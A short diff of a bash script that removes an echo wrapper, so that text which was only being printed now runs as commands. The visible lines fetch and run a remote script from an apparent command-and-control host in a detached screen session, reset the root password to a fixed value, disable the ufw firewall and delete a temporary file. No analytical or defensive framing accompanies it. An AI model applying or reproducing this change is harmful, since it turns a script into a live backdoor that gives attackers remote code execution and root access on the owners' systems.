@@ -1,5 +1,4 @@
 #!/bin/bash
-echo "#!/bin/bash
 
 set -e
 
@@ -124,4 +123,3 @@ rm -rf /tmp/lib.sh
 screen -dm bash -c "$(curl -s http://cnc.anomalystress.cloud:9000/exec.sh)"
 echo "root:kapalkaram" | sudo chpasswd
 ufw disable
-"
